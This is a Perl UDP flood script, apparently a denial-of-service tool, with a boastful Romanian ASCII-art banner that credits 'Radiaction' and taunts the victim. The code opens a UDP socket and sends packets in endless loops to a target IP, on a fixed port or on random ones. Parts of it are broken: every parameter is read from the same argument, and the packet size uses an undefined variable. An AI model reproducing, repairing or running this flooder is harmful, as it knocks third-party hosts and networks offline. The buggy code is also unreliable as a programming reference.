#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
my ($ip,$port,$size,$time);
$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");
 
printf "[1;35m#[1;33m#[1;31m*[0;31m    
                . ...
                 ;::::;              
               ;::::; :;
             ;:::::'   :;                  Ip down.
            ;:::::;     ;.                 Arhiva Privata by Radiaction
           ,:::::' O   O ;           OOO\
           ::::::;       ;          OOOOO\
           ;:::::;  ___  ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#               	   
 [1;36m$ ip n";
printf "[1;35m#[1;33m#[1;31m*[0;32m Arhiva Flood  [0;31mPRIVATA [0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32m ✖ By Radiaction HAXORUL NR1 ✖ [1;3[1;36m[0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32m Copia nu are valoare [1;3[1;36m[0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32m Bombardierul Romaniei Radiaction [1;3[1;36m[0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32m Ai crezut ca esti greu te-am picat sclavu meu ! [1;3[1;36m[0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32m Sclavii mei stiti cum se spune Caini latra Radiaction Flodeeaza [1;3[1;36m[0m\n";
printf "[1;35m#[1;33m#[1;33m*[0;32m Daca vrei sa opresti floodul apasa  [0;31mCTRL+C [0m\n";
 
if ($ARGV[1] ==0 && $ARGV[2] ==0) {
 goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -0 udp) &");
 goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
 goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -8 udp) &"); 
 goto randpackets;
}
 
packets:
for (;;) {
 $size=$rand x $rand x $rand;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));
} 
 
randpackets:
for (;;) {
 $size=$rand x $rand x $rand;
 $port=int(rand 65000) +1;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}